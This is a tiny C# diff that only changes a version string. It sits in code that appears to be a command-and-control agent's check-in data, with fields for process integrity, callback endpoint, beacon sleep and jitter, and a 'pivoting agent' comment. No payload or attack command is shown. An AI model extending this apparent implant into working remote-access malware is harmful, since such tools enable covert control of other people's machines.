@@ -122,7 +122,7 @@ namespace Agent
                 Architecture = IntPtr.Size == 8 ? "x64" : "x86",
                 Integrity = integrity,
                 EndPoint = endpoint,
-                Version = "Net v2.3.1",
+                Version = "Net v2.4.0",
                 SleepInterval = endpoint.ToLower().StartsWith("http") ? 2 : 0, //pivoting agent
                 SleepJitter = 0
             };
